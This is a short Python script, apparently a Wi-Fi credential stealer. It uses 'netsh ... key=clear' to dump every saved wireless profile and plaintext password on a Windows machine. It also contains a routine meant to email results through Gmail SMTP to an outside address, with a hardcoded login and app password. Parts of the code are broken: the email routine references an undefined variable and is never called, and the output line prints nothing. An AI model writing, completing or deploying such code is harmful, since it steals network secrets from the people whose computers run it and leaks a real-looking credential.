import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def get_wifi_passwords():
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

    results = []
    for i in profiles:
        try:
            profile_results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
            password = [b.split(":")[1][1:-1] for b in profile_results if "Key Content" in b]
            password = password[0] if password else ""
            results.append((i, password))
        except subprocess.CalledProcessError:
            results.append((i, "ENCODING ERROR"))

    return results

def send_email():
    sender_email = 'ipfinderhack@gmail.com'
    receiver_email = 'iphack26@example.com'
    subject = 'Subject of the Email'
    message = ""

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587  # Use 465 for SSL or 587 for TLS
    username = 'ipfinderhack@gmail.com'
    password = 'woetytcdydkklwmp'

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()  # For TLS encryption
    server.login(username, password)
    server.sendmail(sender_email, receiver_email, content.as_string())

if __name__ == "__main__":
    wifi_passwords = get_wifi_passwords()
    for wifi, password in wifi_passwords:
        ("{:<30}|  {:<}".format(wifi, password))


